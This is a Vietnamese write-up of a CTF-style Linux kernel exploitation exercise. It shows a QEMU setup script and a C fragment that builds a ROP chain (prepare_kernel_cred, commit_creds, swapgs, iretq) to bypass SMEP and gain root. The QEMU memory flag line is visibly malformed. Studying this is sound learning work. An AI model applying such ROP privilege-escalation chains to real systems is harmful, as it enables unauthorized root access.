# part1.1_bypass_smep

## setup

- Mục tiêu của part 1.1 lần này mình sẽ cố gắng bypass smep smap để có thể hiểu rõ hơn phần lý thuyết
- Challenge mình sử dụng lại ở `part 1`
- Một số chỉnh sửa ở `setup.sh`. Mình sẽ bật `smep, smap` và tắt `kaslr`

```bash
#!/bin/sh
qemu-system-x86_64 \
    -m 128M, smep, smep\
    -cpu kvm64 \
    -kernel vmlinuz \
    -initrd initramfs.cpio.gz \
    -hdb flag.txt \
    -snapshot \
    -nographic \
    -monitor /dev/null \
    -no-reboot \
    -append "console=ttyS0 nokaslr nopti quiet panic=1" \
    -s
```

- Khi mình thực hiện lại phần exploit của part 1, lớp bảo vệ smep đã hoạt động:
  ![Alt text](bin/image.png)

## Khai thác

- Tương tự như part 1, mình sẽ sửa `write_module` để bypass smep
- Mục tiêu ta sẽ như sau:

```
ROP into prepare_kernel_cred(0).
ROP into commit_creds(), with the return value from step 1 as parameter.
ROP into swapgs ; ret.
ROP into iretq with the stack setup as RIP|CS|RFLAGS|SP|SS.
```

- Điều kiện tốt nhất nếu ta có gadget `mov rdi, rax; ret` tuy nhiên nếu không gadget tốt nhất, ta sẽ phải set up tuỳ theo các gadget mà ta có:

```c
payload[off++] = pop_rdi_ret;         // return address
    payload[off++] = 0x0;                 // rdi <- 0
    payload[off++] = prepare_kernel_cred; // prepare_kernel_cred(0)
    payload[off++] = pop_rdx_ret;
    payload[off++] = 0x8;                      // rdx <- 8
    payload[off++] = cmp_rdx_jne_pop2_ret;     // cmp rdx, 8 ; jne 0xffffffff81964cbb ; pop rbx ; pop rbp ; ret
    payload[off++] = 0x0;                      // dummy rbx
    payload[off++] = 0x0;                      // dummy rbp
    payload[off++] = mov_rdi_rax_jne_pop2_ret; // mov rdi, rax ; jne 0xffffffff8166fe7a ; pop rbx ; pop rbp ; ret
    payload[off++] = 0x0;                      // dummy rbx
    payload[off++] = 0x0;                      // dummy rbp
    payload[off++] = commit_creds;             // commit_creds(prepare_kernel_cred(0))
```
